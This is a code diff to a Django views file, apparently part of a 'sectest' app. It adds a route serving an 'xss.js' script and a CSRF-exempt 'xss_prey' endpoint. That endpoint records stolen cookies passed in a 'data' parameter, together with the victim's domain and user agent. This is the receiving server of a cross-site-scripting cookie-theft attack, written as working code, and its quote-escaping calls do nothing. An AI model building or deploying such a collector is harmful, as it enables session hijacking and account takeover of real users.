@@ -34,3 +34,30 @@ def postmessage_child(request):
 
 def xss(request):
     return render(request, 'sectest/xss.html')
+
+
+def xss_js(request):
+    return render(request, 'sectest/xss.js')
+
+
+@csrf_exempt
+def xss_prey(requests):
+    if 'HTTP_X_FORWARDED_FOR' in requests.META:
+        ip = requests.META['HTTP_X_FORWARDED_FOR']
+    else:
+        try:
+            ip = requests.META['REMOTE_ADDR']
+        except:
+            ip = '0.0.0.0'
+    ip = ip.replace("'","\'")
+    domain = requests.GET.get('domain','Unknown').replace("'","\'")
+    user_agent = requests.META.get('HTTP_USER_AGENT','Unknown').replace("'","\'")
+    # method = requests.method.replace("'","\'")
+    cookie = requests.GET.get('data', 'No data').replace("'","\'")
+
+    XssPrey.objects.create(domain=domain, user_agent=user_agent, cookie=cookie)
+    # keep_alive = requests.GET.get('keepsession','0').replace("'","\'")
+    # list = [now_time,ip,origin,software,method,data,keep_alive]
+    # put_mysql(list,url)
+
+    return HttpResponse('{"status":"ok"}', content_type='application/json')
